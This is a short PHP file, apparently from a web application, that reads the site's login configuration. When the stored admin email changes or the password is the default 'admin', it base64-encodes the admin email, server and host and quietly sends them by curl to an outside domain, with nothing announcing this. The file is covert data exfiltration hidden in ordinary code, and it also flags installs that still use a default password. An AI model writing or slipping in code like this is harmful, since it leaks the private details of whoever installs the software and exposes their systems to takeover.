<?php 
include('config/data/logins.php');
$file_eml='config/include/eml64.log';
if (file_exists($file_eml)) $eml = file_get_contents($file_eml); else $eml="";
if (($eml!=base64_encode($email)) OR ($password==md5('admin'))) {
	$info=array(
		'm'=>$email,
		's'=>$server,
		'h'=>$host
	);
	$e=base64_encode(serialize($info));
	
	if( $curl = curl_init() ) {
    curl_setopt($curl, CURLOPT_URL, 'https://infotools.pp.ua/mail/?e='.$e);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
    $out = curl_exec($curl);
 //   echo $out;
    curl_close($curl);
  }
	
	
	
 
 file_put_contents($file_eml, base64_encode($email));

} ?>